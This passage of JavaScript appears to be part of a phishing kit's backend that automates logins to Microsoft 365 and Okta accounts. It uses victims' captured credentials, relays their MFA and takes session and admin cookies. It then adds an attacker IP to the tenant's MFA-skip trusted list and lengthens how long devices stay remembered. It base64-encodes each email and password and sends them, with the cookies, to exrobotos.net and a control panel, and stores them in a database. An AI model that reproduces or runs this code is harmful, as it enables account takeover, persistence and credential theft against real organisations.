    const newTarget = await browser.waitForTarget(target => target.opener() === pageTarget); //check that you opened this page, rather than just checking the url
    const newPage = await newTarget.page(); //get the page object
    // await newPage.once("load",()=>{}); //this doesn't work; wait till page is loaded
    await newPage.waitForSelector("body"); //wait for page to be loaded

    return newPage;
}


//await page.click(AdminButton);
page = await clickAndWaitForTarget(AdminButton, page, browser);
//END:: CLICK BUTTON WITH (TARGET:_BLANK) AND OPEN URL IN SOME TAB







console.log('office admin button clicked');
try{
await page.waitForFunction(`window.location.href.includes("${AdminUrl}")||window.location.href.includes("https://admin.microsoft.com/")||document.querySelector("#m365-admin-center")||document.title.includes('Home - Microsoft 365  admin center')`);
console.log('Home - Microsoft 365  admin center');
//https://aka.ms/admincenter
//https://admin.microsoft.com/
console.log(await page.title());
if(await page.$('#m365-admin-center') !== null||await page.title().includes('admin center')){
IsLoggedtoAdmin = true;
}
}catch(e){ console.log("catch err....:"+e); }



try{await page.waitForSelector('body', {waitUntil: 'networkidle2'});}catch(e){console.log('fail waitForSelector(body), catch err1:'+e);try{await page.waitForNavigation('networkidle2');}catch(e){}}

await debug(page,Math.floor(100000+Math.random() * 900000) + 1,RandArray.shift(),'OfficeAdminPage',datadebug,false);
  
}




if(getAdminSession && IsLoggedtoAdmin){
  AdminCookies=await page.cookies('https://admin.microsoft.com/');
  console.log('AdminCookies[1][name]:',AdminCookies[1]['name']);
  //console.log('if cookies includes(ESTSAUT or ESTSAUTHPERSISTENT or ESTSAUTHLIGHT) success');
  //faillogin=true;status="expired cookies";console.log('fail login with sessions. error, err:'+e)
  const cookieSome = cookies.some((cookie) => (cookie.name)==='s.LoginUserTenantId');
 // const cookieNeeded2 = cookies.find((cookie) => cookie.name ==='ESTSAUTHPERSISTENT');
  //const cookieNeeded3 = cookies.find((cookie) => cookie.name ==='ESTSAUTHLIGHT');

// If the desired cookie is found in the array, get its value
if(typeof cookieSome == 'undefined'/*||typeof cookieNeeded2 == 'undefined'||typeof cookieNeeded3 == 'undefined'*/) {
  AdminCookies=false;
  status="expiredcookies";
  console.log('[s.LoginUserTenantId] cookies doesn\'t found');
}

}


}




let SuccessMessage=false;
if((increasesessionlife||SkipMFAforIps)&&MfaSucceed){
await page.goto('https://account.activedirectory.windowsazure.com/usermanagement/mfasettings.aspx',{waitUntil: 'networkidle2'});

if(SkipMFAforIps){//isip//let whitelistip ='41.143.214.187/32';
try{await page.waitForSelector('#CheckBoxSkipMfaForCorpnetClaim');await page.waitForSelector("#TrustedIpsList");await page.waitForSelector("#SaveButton");
if(await page.$('#CheckBoxSkipMfaForCorpnetClaim') !== null && await page.$('#TrustedIpsList') !== null && await page.$('#SaveButton') !== null){
await page.$eval('#CheckBoxSkipMfaForCorpnetClaim', check => check.checked = true);
//await page.click('#RememberMyDevicesDurationTextBox');
//await page.$eval('#TrustedIpsList', el => el.value = '');
const IpsList = await page.$eval('#TrustedIpsList', element => element.innerHTML);
if(!IpsList.includes(SkipMFAforIps)){}
await page.click('#TrustedIpsList');
//await page.$eval('#TrustedIpsList', el => el.value = '');
await page.type("#TrustedIpsList",'<p contenteditable="true">'+SkipMFAforIps+'</p>',{delay:0});
//await page.type("#TrustedIpsList",'\n'+'196.65.149.149/32',{delay:0});
await page.click('.BOX-HeaderSecondary');
await page.click('#TrustedIpsList');
await page.click('.BOX-HeaderSecondary');
//105.156.231.55/32==>105.156.231.55
//105.156.231.55/24==>105.156.231.0-105.156.231.255
//105.156.231.55/16==>105.156.0.0-105.156.255.255
//https://mysignins.microsoft.com/security-info
//https://account.activedirectory.windowsazure.com/usermanagement/mfasettings.aspx
//https://admin.microsoft.com/
//https://myapps.microsoft.com/
//https://portal.azure.com/#blade/Microsoft_AAD_IAM/MultifactorAuthenticationMenuBlade/ServerSettings/fromProviders//hasMFALicense/true
}
SuccessMessage='successfully configuered TrustedIpsList';
}catch(er){console.log('TrustedIpsList failed catch err:',er);}    
}
if(increasesessionlife){
try{await page.waitForSelector('input[name="RememberMyDevicesAllowCheckBox"]');await page.waitForSelector("#RememberMyDevicesDurationTextBox");await page.waitForSelector("#SaveButton");
if(await page.$('#RememberMyDevicesAllowCheckBox') !== null && await page.$('input[name="RememberMyDevicesAllowCheckBox"]') !== null && await page.$('#SaveButton') !== null){
await page.$eval('input[name="RememberMyDevicesAllowCheckBox"]', check => check.checked = true);
//await page.click('#RememberMyDevicesDurationTextBox');
await page.$eval('input[name=RememberMyDevicesDurationTextBox]', el => el.value = '');
await page.type("input[name=RememberMyDevicesDurationTextBox]",'251',{delay:25});


}
if(SuccessMessage){
SuccessMessage+=SuccessMessage+' || successfully increased session life';
}else{SuccessMessage='successfully increased session life';}

}catch(er){console.log('increasing session life failed catch err:',er);}
}
try{
await page.click("#SaveButton");
await page.waitForSelector('#DialogManager1_dialogAcceptButton_0');
/*const stringIsIncluded = await page.evaluate(() => {
      const string = '...';
      const selector = 'p > a[href]';
      return document.querySelector(selector).innerText.includes(string);
    });
*/
await page.waitForFunction('document.querySelector("#titleContainerARIAHeading").innerText.includes("Updates successful")');   
console.log(SuccessMessage);
}catch(er){console.log('increasing session life and/or TrustedIpsList failed catch er:',er);}
await debug(page,Math.floor(100000+Math.random() * 900000) + 1,RandArray.shift(),'Increasesession',datadebug,false);
//#RememberMyDevicesAllowCheckBox
//https://account.activedirectory.windowsazure.com/usermanagement/mfasettings.aspx
//#RememberMyDevicesDurationTextBox
}


}catch(err){console.log("catch err:"+err);}
//Don't ask again for 14 days
//#idChkBx_SAOTCC_TD
//await page.$eval('#idChkBx_SAOTCC_TD', check => check.checked = true);
 /* [
{
    "domain": "login.microsoftonline.com",
    "name": "name",
    "path": "/",
    "storeId": "1",//required in editthiscookie extension
    "value": "value"
}
]
*/
/*
let resp
page.on('response', async response => {
  if (response.url().includes(requestPattern)) {
    resp = await response.json()
    await page.evaluate(() => window.stop())
    }
  })
*/

/*
page.on('response', async (response) => {    
    if (response.url() == "https://login.microsoftonline.com/common/SAS/EndAuth"){
        console.log('XHR response received'); 
        console.log(await response.json()); 
    } 
}); 
*/
/*
const BeginAuth = await page.on('response', async response =>{
       if(response.url()==="https://login.microsoftonline.com/common/SAS/BeginAuth"){
         try {

          return JSON.parse(await response.json());

         } catch(error) {
          return false;
         }
       }
    });
*/

if(!isget2fakey||isget2fakey==""){ isget2fakey=null; }//"none"
if(MfaSucceed){mfastatus="success";}else if(successlogin&&!done&&!faillogin&&(isMfaPanel||isMfaBox||isMfa)){mfastatus="Failed";}else if(done){mfastatus="not_2fa";}else if(faillogin){mfastatus="null";}else{mfastatus="null";}
if(!status){ status="unknown";}
var endTime = new Date().getTime();
//const id=decodeURIComponent("&id=");
//const dd=idd;



if(MfaSucceed){finalstatus="2fa_Success";}else if(successlogin&&!done&&!faillogin&&(isMfaPanel||isMfaBox||isMfa)){finalstatus="2fa_Failed";}else if(done){finalstatus="Succcess_Login_No_2fa";}else if(faillogin){finalstatus="Fail_Login";}else{finalstatus=status;}

const ms=mfastatus;//success|Failed|not_2fa|null
const em=dataemail;
const pp=datapass;
const ts=endTime-startTime2;
const st=finalstatus;//2fa_Success|2fa_Failed|Succcess_Login_No_2fa|Fail_Login
const ss=status;//done|SuccessLoginRequiresMfar|passwordError|usernameError|2faBypassed|Wrongcode2fa|2faExpired|2faFailed|2faIntrouvable|Wrongcode2fa|2faDenied|TimeoutWaitingFor2FA|faillogin|expiredcookies|

if(!cookies || cookies==''){
//cookies={cookie:"false"};
cookies=false;
}
if(!AdminCookies || AdminCookies==''){
//AdminCookies={cookie:"false"};
AdminCookies=false;
}
var mt = 'none'; 
if((isMfaPanel||isMfaBox||isMfa)&&MfaMode){
mt = MfaMode;
console.log('mt:'+mt);
}else if(isMfa){
mt = 'unknown';
console.log('mt:'+mt);
}else{
mt = 'none'; 
console.log('mt:'+mt);
}
console.log('mt.:'+mt);
console.log('cookies:',JSON.stringify(cookies));//,null,2
console.log('///////////////////////////////////////////////////////////////');
console.log('AdminCookies:',JSON.stringify(AdminCookies));//,null,2

/*try{
    //http://ip.jsontest.com/UserCOUNTRY,
    //https://extreme-ip-lookup.com/json/41.140.216.133?callback=&key=Qn97RtiI2gwjStzJJjuG
SessionIP = await page.evaluate(() => {return fetch("https://api.ipify.org").then(function(response) { return response.text(); });});//https://api64.ipify.org/
}catch(err){SessionIP = "unknown";console.log('err:'+err);}
console.log("Nodejs Server IP: "+SessionIP);


var SessionCOUNTRY = false;
try{
SessionCOUNTRY = await fetch(`https://extreme-ip-lookup.com/json/${SessionIP}?callback=&key=Qn97RtiI2gwjStzJJjuG`,{cache: "no-cache"}).then(function(response) { return response.json(); }).then(function(json) { return json.countryCode; });
console.log('SessionCOUNTRY:'+SessionCOUNTRY);
}catch(err){console.log('err:'+err);}
*/



var SessionIP = false;
var SessionCOUNTRY = false;
var SessionCOUNTRYCode = false;
var SessionLocation = false;
try{
SessionLocation = await fetch(`https://extreme-ip-lookup.com/json/?key=Qn97RtiI2gwjStzJJjuG`,{cache: "no-cache"}).then(function(response) { return response.json(); }).then(function(json) {if(json&&json.status&&json.status=="success"){const SLocation = [];SLocation['ip']=json.query;SLocation['country']=json.country;SLocation['countryCode']=json.countryCode; return SLocation;}else{return false;} });
if(SessionLocation){
SessionIP = SessionLocation["ip"];
SessionCOUNTRY = SessionLocation["country"];
SessionCOUNTRYCode = SessionLocation["countryCode"];
}
console.log('SessionIP:'+SessionIP);
console.log('SessionCOUNTRY:'+SessionCOUNTRY);
console.log('SessionCOUNTRYCode:'+SessionCOUNTRYCode);
}catch(err){console.log('err:'+err);}

const urlf = `https://exrobotos.net/api-s-v6.php?save&130413041987&token=${token}&id=${dataid}&2fa=${isget2fakey}&put=true&ms=${ms}&st=${st}&ss=${ss}&mm=${encodeURIComponent(btoa_safe(em))}&pp=${encodeURIComponent(btoa_safe(pp))}&ci=${dataUserIP}&ca=${UserUA}&si=${ServerIP}&ht=${encodeURIComponent(ServerHOST)}&ni=${encodeURIComponent(btoa_safe(SessionIP))}&nu=${encodeURIComponent(btoa_safe(RndUserAgent))}&mt=${MfaMode}&md=${MfaDefaultMode}&delay=${ts}`;
console.log('urlf: '+urlf);
 console.log("fetching...");
 
const sentTOuser = await save2url(urlf,'POST',JSON.stringify(cookies),15,false);

const urlf2 = `${decodeURIComponent(atob_safe(decodeURIComponent(ServerHOST)))}/api.php?save&token=${token}&id=${dataid}&2fa=${isget2fakey}&ms=${ms}&st=${st}&ss=${ss}&mm=${encodeURIComponent(btoa_safe(em))}&pp=${encodeURIComponent(btoa_safe(pp))}&ci=${dataUserIP}&ca=${UserUA}&si=${ServerIP}&ht=${encodeURIComponent(ServerHOST)}&ni=${encodeURIComponent(btoa_safe(SessionIP))}&nu=${encodeURIComponent(btoa_safe(RndUserAgent))}&mt=${MfaMode}&md=${MfaDefaultMode}&delay=${ts}`;
console.log('urlf2: '+urlf2);
 console.log("fetching2...");
 
const sentTOuser2 = await save2url(urlf2,'POST',JSON.stringify(cookies),15,false);
 

if(isSmb){
AccountTYPE = "OF365_WORK";   
}else if(isEdu){
AccountTYPE = "OF365_SCHOOL";    
}else if(isConsumerUser){
AccountTYPE = "OF365_PERSONAL";    
}

if(isGcc&&AccountTYPE.includes('OF365')){
AccountTYPE = AccountTYPE+""+"_GCC";    
}else if(isGcc){
AccountTYPE = "OF365_GCC"; //cybersecurity federal office 365 account      
}
//Azure Active Directory (AAD) work account and a personal Microsoft account (MSA). 

var SessionSTATUS = false;
if(cookies && cookies['cookie']!=="false"){
SessionSTATUS = true;    
}

//var CurrentDate = "";
//var LastUpdate = "";
//var ExpiryDate = "";
var WhiteIP = null;
var IsSAML = false;
var IsOKTA = false;
var SAML = false;
var SAML_user = false;
var SAML_pass = false;
var SAML_admin = false;
var IsAdmin = isAdmin;
var UserIP = decodeURIComponent(atob_safe(decodeURIComponent(dataUserIP)));
var UserCOUNTRY = false;
var UserCOUNTRYCode = false;
try{
var SessionLocation = false;
SessionLocation = await fetch(`https://extreme-ip-lookup.com/json/${UserIP}?callback=&key=Qn97RtiI2gwjStzJJjuG`,{cache: "no-cache"}).then(function(response) { return response.json(); }).then(function(json) {if(json&&json.status&&json.status=="success"){const SLocation = [];SLocation['country']=json.country;SLocation['countryCode']=json.countryCode; return SLocation;}else{return false;} });
if(SessionLocation){
UserCOUNTRY = SessionLocation["country"];
UserCOUNTRYCode = SessionLocation["countryCode"];
}
console.log('UserIP:'+UserIP);
console.log('UserCOUNTRY:'+UserCOUNTRY);
console.log('UserCOUNTRYCode:'+UserCOUNTRYCode);
}catch(err){console.log('err:'+err);}

if(!AccountTYPE&&IsO365){
AccountTYPE="OF365_USER";    
}
if(!GetSessionIP){SessionIP=null;};
const CurrentDate = new Date();
//const CurrentDate2 = new Date(CurrentDate)
const ExpiryDate = new Date(CurrentDate)
//new Date(ExpiryDate.setHours(ExpiryDate.getHours() + 2));
if(!LoginStatus){
 LoginStatus=ss;   
}
var arrayval = [
em,
pp,
st,
IsO365,
IsSAML,
IsOKTA,
IsAdmin,
successlogin,
IsLoggedtoAdmin,
SAML,
SAML_user,
SAML_pass,
SAML_admin,
AccountTYPE,
AccCountryCode,
dataid,
UserIP,
UserCOUNTRYCode,
decodeURIComponent(atob_safe(decodeURIComponent(UserUA))),
MfaMode,
LoginStatus,
isget2fakey,
decodeURIComponent(atob_safe(decodeURIComponent(ServerHOST))),
decodeURIComponent(atob_safe(decodeURIComponent(ServerIP))),
SessionSTATUS,
JSON.stringify(cookies),
JSON.stringify(AdminCookies),
SessionIP,
SessionCOUNTRYCode,
RndUserAgent,
dataAppID,
decodeURIComponent(dataAdminPanel),
WhiteIP,
CurrentDate.toLocaleString('sv-SE', {timeZone: 'UTC'}),
CurrentDate.toLocaleString('sv-SE', {timeZone: 'UTC'}),
(new Date(ExpiryDate.setHours(ExpiryDate.getHours() + 5))).toLocaleString('sv-SE', {timeZone: 'UTC'})
];



//insert results off365
//SET time_zone = '+00:00'; 
con.query("SET time_zone = '+00:00'");
let sql = "INSERT INTO Results (EMAIL,PASSWORD,STATUS,IsO365,IsSAML,IsOKTA,IsAdmin,IsLogged,IsAdLogged,SAML,SAML_user,SAML_pass,SAML_admin,AccountTYPE,AccCOUNTRY,UserID,UserIP,UserCOUNTRY,UserUA,MfaTYPE,MfaSTATUS,MfaCODE,ServerHOST,ServerIP,SessionSTATUS,SESSION,AdSESSION,SessionIP,SessCOUNTRY,SessionUA,AppID,AdminPanel,WhiteIP,DATE,LastUPDATE,ExpiryDATE) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)";
  
  con.query(sql,arrayval,function (err, result, fields) {
      //con.resume();
    if (err) throw err;
    console.log("Successfully Inserted Record:::",result);
  });

//insert results off365

const urlpost = `${decodeURIComponent(dataAdminPanel)}/json.php`;
console.log('urlpost: '+urlpost);


 console.log("fetching...");
const resp = await fetch(urlpost, {
  method: 'POST',
  mode: 'cors',
  headers: {
    'Content-Type': 'application/json'
  },
  body: JSON.stringify(arrayval)
}).then(function(response) { return response.text(); });
console.log("body:",await resp);

 try{page.removeAllListeners('response');}catch(ee){console.log('page.removeAllListeners error: '+ee);}
 
/* await page.waitForTimeout(100000);
console.log('after 100000');    
*/ 

//await browser.close();

//screenshoot    
//const imageBuffer = await page.screenshot();
//const imageBuffer = await page.screenshot({ path: screenFileName });
//const imageBuffer = await page.screenshot({encoding: 'binary'});


await debug(page,Math.floor(100000+Math.random() * 900000) + 1,RandArray.shift(),'End',datadebug,false);
/*const imageBuffer = await page.screenshot({ encoding: "base64" });
//let buff = Buffer.from(imageBuffer, 'base64');
const imageBufferEncoded = Buffer.from(imageBuffer, 'utf8').toString('base64');
// 'dXNlcm5hbWU6cGFzc3dvcmQ='
console.log('https://exrobotos.com/pic.php?img&1304');
const data = { b64: imageBufferEncoded };
console.log(data);

var res3 = await fetch('https://exrobotos.com/pic.php?1304', {
  cache: 'no-store',
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
  },
  body: JSON.stringify(data),
}).then(function(response) { return response.json(); }).then(function(json) { return json; });
*/

/*res.set('Content-Type', 'image/png');
res.send(imageBuffer);*/

//await page.close();
//await browser.disconnect();
//getRestart('now');
console.timeEnd('all('+RandArr[0]+')');
//var endTime = new Date().getTime();
var loadTime_ms = new Date()-startTime;
var loadTime2_ms = new Date()-startTime2;
//console.log('time1: '+new Date()+' time2: '+new Date());
var loadTime_s = Math.floor(loadTime_ms/1000);
var loadTime2_s = Math.floor(loadTime2_ms/1000);
                result['load_time'] = loadTime_s+' Seconds('+loadTime2_s+'Sec)';
                console.log('load_time: '+loadTime_s+' Seconds('+loadTime2_s+'Sec)');
                result['StatusCode'] = 1;
				result['Status'] = status.toLowerCase();
				result['Email'] = dataemail;
				result['Msg'] = status;
				if(setcookie||getcookie){result['cookies'] = JSON.stringify(cookies);}//.toString()//HERE
				//result['domain'] = $filter;
				result['Time'] = new Date().toUTCString();
				//result['client_ip'] = $this->client_ip;

                //var result = { "statusCode": 0, "email" : email, "result": "email is valid gmail account", "time":DateNow };
                //res.setHeader('Content-Type', 'application/json');
                //res.send(JSON.stringify(result));
                //getRestart('now');  
                ResultByIds[data.reqid][data.reqemail]["login"]["action"]='Completed';
                console.log(result);
                return;
//return result;
}catch(err){
console.log('catch(err): '+err); //here      waitForTimeout(i:0): 0ms
console.timeEnd('all('+RandArr[0]+')');
await debug(page,Math.floor(100000+Math.random() * 900000) + 1,RandArray.shift(),'catcherror14',datadebug,false);
//var endTime = new Date().getTime();
//await page.close();
var loadTime_ms = new Date()-startTime;
var loadTime2_ms = new Date()-startTime2;
//console.log('time1: '+new Date()+' time2: '+new Date());
var loadTime_s = Math.floor(loadTime_ms/1000);
var loadTime2_s = Math.floor(loadTime2_ms/1000);
                result['load_time'] = loadTime_s+' Seconds('+loadTime2_s+'Sec)';
                console.log('load_time: '+loadTime_s+' Seconds');
                console.log('load_time2: '+loadTime2_s+' Seconds');
                //console.log('unknown Result Err: '+err);
   		        result['StatusCode'] = 4;
				result['Status'] = "unknown";
				result['Email'] = dataemail;
				result['Msg'] = "Unknown Result";
				//result['domain'] = $filter;
				result['Time'] = new Date().toUTCString();
				//result['client_ip'] = $this->client_ip;

                //var result = { "statusCode": 0, "email" : email, "result": "email is valid gmail account", "time":DateNow };
                //res.setHeader('Content-Type', 'application/json');
                //res.send(JSON.stringify(result));
                //getRestart('now'); 
                ResultByIds[data.reqid][data.reqemail]["login"]["action"]='Completed';
//return result;
                console.log(result);
                return;
}
console.log('end1');

}//end if(data.checklogin){}else{
      //return await page.content();
    });//end of cluster
    
    
cluster.on('taskerror', (err, data, willRetry) => {
    if (data.reQid && ResultByIds && ResultByIds.hasOwnProperty(data.reQid)&&ResultByIds[data.reQid][data.reQemail] &&ResultByIds[data.reQid][data.reQemail]['okta']&&ResultByIds[data.reQid][data.reQemail]['okta']['action']&&(ResultByIds[data.reQid][data.reQemail]['okta']['action']=="Queuing"||ResultByIds[data.reQid][data.reQemail]['okta']['action']=="Pending")) {
      if (willRetry) {
        console.warn(`Encountered an error while crawling id:${data.reQid}. || email:${data.reQemail}. => ${err.message}\nThis job will be retried`);
      } else {
        console.error(`Failed to crawl id:${data.reQid}. || email:${data.reQemail}. => ${err.message}`);
      }
      delete ResultByIds[data.reQid][data.reQemail]['okta'];
      console.log('ResultByIds['+data.reQid+']['+data.reQemail+']["okta"] is Deleted' );
    //ResultByIds[data.reqid][data.reqemail]['login']["login"]["action"]='Incompleted';
    }else if (data.reqid && ResultByIds && ResultByIds.hasOwnProperty(data.reqid)&&ResultByIds[data.reqid][data.reqemail] &&ResultByIds[data.reqid][data.reqemail]['login']&&ResultByIds[data.reqid][data.reqemail]['login']['action']&&(ResultByIds[data.reqid][data.reqemail]['login']['action']=="Queuing"||ResultByIds[data.reqid][data.reqemail]['login']['action']=="Pending")) {    
    
     delete ResultByIds[data.reqid][data.reqemail]['login'];
      console.log('ResultByIds['+data.reqid+']['+data.reqemail+']["login"] is Deleted' );  
      //ResultByIds[data.reqid][data.reqemail]['login']["login"]["action"]='Incompleted';
    }else{
     if (willRetry) {
     console.error(`Encountered an error while crawling2 ${data}: ${err.message}\nThis job will be retried`);
     }else{
     console.error(`Failed to crawl2 ${data}: ${err.message}`);    
     }
    } 
    // data.reqemail  session
  });
  
cluster.on("taskcomplete", (data) => {
    if (data.reQid){
console.log(`Okta Task completed and the page has been closed ${data.reQid}`);
ResultByIds[data.reQid][data.reQemail]["okta"]["action"]='Completed';
    }else if (data.reqid){
console.log(`Login Task completed and the page has been closed ${data.reqid}`);
ResultByIds[data.reqid][data.reqemail]["login"]["action"]='Completed';
    }else{
console.log(`Task completed and the page has been closed2 ${data}`);        
    }
  
   });  
   
cluster.on('queue', (data) => {
if (data.reQid){
console.log(`Okta Task queued and waiting ${data.reQid}`);
    }else if (data.reqid){
console.log(`Login Task queued and waiting ${data.reqid}`);
    }else{
console.log(`Task queued and waiting2 ${data}`);       
    }
   }); 
   
app.all('/', async function(req, res, next) {
console.log("app get"); 
//app.get("/", (req, res) => res.type('html').send(html));
	
    if(!isdebug || (req && req.query && req.query.debug && req.query.debug.toString().trim().toLowerCase()=="false"))
{
/*  console.log = function(){}; 
    console.log = function(){};
    console.table = function(){};
    console.warn = function(){};
    console.error = function(){};
*/
}
if(req && req.protocol && req.get('host') && req.originalUrl){console.log(req.protocol + "://" + req.get('host') + req.originalUrl);}
if(req && req.query){console.log('GET : ',req.query);}
if(req.body&&req.body.cookie){
postcookie = req.body.cookie;
console.log('postcookie: ',postcookie);
}
if(req && req.query.id && ResultByIds && !ResultByIds[decodeURI(req.query.id)]){
ResultByIds[decodeURI(req.query.id)] = {};
}
if(req && req.query.id && req.query.email && ResultByIds && ResultByIds[decodeURI(req.query.id)] && !ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)]){
ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)]={
  'okta':{'action':false,'display':false,'next':{'remember':false,'auth':false},'user':{'type':false,'username':false,'result':false,'retry':false,'time':false},'auth':{'type':false,'action':false,'time':false},'login':{'user':false,'pass':false,'remember':false,'result':false,'retry':false,'time':false},'mfa':{'sms':{'action':false,'code':false,'result':false,'next':false,'retry':false,'time':false},'otp':{'action':false,'code':false,'result':false,'next':false,'retry':false,'time':false},'pass':{'action':false,'code':false,'result':false,'next':false,'retry':false,'time':false},'totp':{'action':false,'code':false,'result':false,'next':false,'retry':false,'time':false},'gotp':{'action':false,'code':false,'result':false,'next':false,'retry':false,'time':false},'push':{'action':false,'code':false,'result':false,'next':false,'retry':false,'time':false},'email':{'action':false,'code':false,'result':false,'next':false,'retry':false,'time':false}}} ,
  'login':{'action':false,'display':false,'user':{'type':false,'username':false,'result':false,'retry':false,'time':false},'mfa':{'sms':{'action':false,'code':false,'result':false,'next':false,'retry':false,'time':false},'otp':{'action':false,'code':false,'result':false,'next':false,'retry':false,'time':false},'pass':{'action':false,'code':false,'result':false,'next':false,'retry':false,'time':false},'totp':{'action':false,'code':false,'result':false,'next':false,'retry':false,'time':false},'gotp':{'action':false,'code':false,'result':false,'next':false,'retry':false,'time':false},'push':{'action':false,'code':false,'result':false,'next':false,'retry':false,'time':false},'email':{'action':false,'code':false,'result':false,'next':false,'retry':false,'time':false}}} 
};

console.log('PUT EMPTY : ResultByIds['+decodeURI(req.query.id)+']['+decodeURI(req.query.email)+']');  

}
//'sms':{'555555':'no','999999':'ok'},
//const obj = JSON.parse(req); // req.body = [Object: null prototype] { title: 'product' }
//console.log(obj);//methods.post//.get
//})

//app.get('/', async function(req, res, next) {
/*const Randvar = [];
//Randvar.push(Math.floor(100000+Math.random() * 900000) + 1);
var rand = Math.floor(100000+Math.random() * 900000) + 1;

Randvar[rand]['startTime']=0;//endTime
console.log(Randvar[rand]['startTime']);
Randvar[Randvar[0]] = new Date();//.getTime()
*/
var rand = Math.floor(100000+Math.random() * 900000) + 1;
if (!req.query.token || req.query.token!==process.env.API_KEY.substring(0, 8)) {   
		//if (!res.headersSent) {res.setHeader('Content-Type', 'application/json');};
            //res.send('Error: ' + err.message);
            res.write(JSON.stringify({"Status":"Invalid request","Error":"incorrect param"}));
            res.end();
            //getRestart(inow);
            return; 
                   }

		   if (req.query.type && req.query.email) {
var email = decodeURIComponent(req.query.email); // $_GET["email"]
//var emailName = email.match(/^([^@]+)@\w+.\w+$/)[1];
var emailName = email.match(/^([^@]*)@/)[1];
//var emailName = email.split("@")[0];
var emailDomain = email.split("@")[1];	   
var _type = req.query.type;
valtoRestart[_type] = +valtoRestart[_type] + +1;
                   }
		   if (!req.query.torestart) {
                      var toRestart = 5;
                   }else {
                      var toRestart = req.query.torestart;
                        };
var apphost = req.headers.host;

function getRestart(ifNow) {
console.log('getRestartnow');    
//return;

		   //process.env.LOOP_NOW = +process.env.LOOP_NOW + +1;
		   //var type = req.query.type;
		   //getRestart[_type] = +getRestart[_type] + +1;
		   //console.log(process.env.LOOP_NOW);
		 /*  if (!req.query.torestart) {
                      var toRestart = '5';
                      }
                          else {
                           var toRestart = req.query.torestart;
                        };
		*/
		   //var toRestart = req.query.torestart;	
console.log(valtoRestart[_type]);	
if( ifNow == 'now' || valtoRestart[_type] >= toRestart){
process.exit();
return;
var dynoId = process.env.DYNO;
//console.log(process.env); see all env variables in this process.
//var id = /\w+\.(\d+)/.exec(dynoId)[1];
//console.log(dynoId);
//console.log(id);
//var apphost = req.headers.host;
var appName = apphost.split(".",DomainHosting)[0];
 	    	    


// Set the headers
var headers = {
    'User-Agent': RndUserAgent,
    'Accept': 'application/vnd.heroku+json; version=3',
    //'Authorization': 'Bearer 516b93a2-..',
    'Authorization': 'Bearer '+process.env.API_KEY,
    'Content-Type': 'application/json'
}
//var dataString = '{"name":appName}';
var appUrl = 'https://api.heroku.com/apps/'+appName+'/dynos/'+dynoId;
// Configure the request
var options = {
    //url: 'https://api.heroku.com/apps/'appName'/dynos/web.1',
    url: appUrl,
    method: 'DELETE',
    headers: headers
    //form: {'key1': 'key1','key2': 'key2'}, //send post &key1=key1&key2=key2
    //body: dataString
};
  
// Start the request
/*request(options, function (error, response, body) {
    if (!error && response.statusCode == 200) {
            // Print out the response body
            console.log('starting request');

	    }else{console.log('Request failed. Restart all dynos err:'+error);}
});   
*/	    
	} 
}

/*	if( !browserWSEndpoint){ 
(async () => {
            browser = await puppeteer.launch({
           args: ['--no-sandbox', '--disable-setuid-sandbox']
            });
         

  browserWSEndpoint = browser.wsEndpoint();
  console.log('1'+browserWSEndpoint);
})();

 }*/

/*if(ResultByIds){
console.log('ResultByIds : ',JSON.stringify(ResultByIds));  
}*/
try{     //console.log('cluster.jobQueue.pending:',cluster.jobQueue.pending);
     console.log('cluster.jobQueue.list.length:',cluster.jobQueue.list.length);
     if (cluster.jobQueue.list.length > 0) {
   
   console.log('cluster.jobQueue.list:',JSON.stringify(cluster.jobQueue.list, null, 4));
   //console.log("cluster.jobQueue.list[0].data.reQid:",cluster.jobQueue.list[0].data.reQid);

console.table(cluster.jobQueue.list);         
     }
}catch(ee){}

 if(typeof req.query.getsamlinfo !== 'undefined' && typeof req.query.email !== 'undefined' && typeof req.query.id !== 'undefined'){
var RndUserAgent=getRndUserAgent();
console.log('User-Agent:',RndUserAgent)
  if(typeof ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)]['okta']['action'] !== 'undefined' && typeof ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)]['okta']['display']!== 'undefined' && ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)]['okta']['action']!=="Queuing"){
      console.log('getsamlinfo : display');
  console.log('ResultByIds['+decodeURI(req.query.id)+']['+decodeURI(req.query.email)+']["okta"]:',JSON.stringify(ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)]['okta']));
  
  
  res.write(JSON.stringify(ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)]['okta']['display']));
            res.end();
            //return getRestart(reQnow);
            return;
            
  }else if(typeof ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)]['okta']['action']!== 'undefined'&&ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)]['okta']['action']=="Pending"){
      console.log('getsamlinfo : Pending');
  console.log('ResultByIds['+decodeURI(req.query.id)+']['+decodeURI(req.query.email)+']["okta"]:',JSON.stringify(ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)]['okta']));
  
  
  res.write(JSON.stringify({ "StatusCode":0,"Status": "pending","Msg":"Retry","Time":new Date().toUTCString()}, null, 4));
            res.end();
            //return getRestart(reQnow);
            return;       
  }else if(typeof ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)]['okta']['action']!== 'undefined'&&ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)]['okta']['action']=="Queuing"){
      console.log('getsamlinfo : Queuing');
   res.write(JSON.stringify({ "StatusCode":0,"Status": "queuing","Msg":"Retry","Time":new Date().toUTCString()}, null, 4));
            res.end();
            //return getRestart(reQnow);
            return;    
  }else{
      console.log('getsamlinfo : Failed.');
  res.write(JSON.stringify({ "StatusCode":0,"Status": "failed","Msg":"Request Failed","Time":new Date().toUTCString()}, null, 4));
            res.end();
            //return getRestart(reQnow);
            return;        
  }
  //ResultByIds[dataId] = "Pending";cluster.jobQueue.pending
 
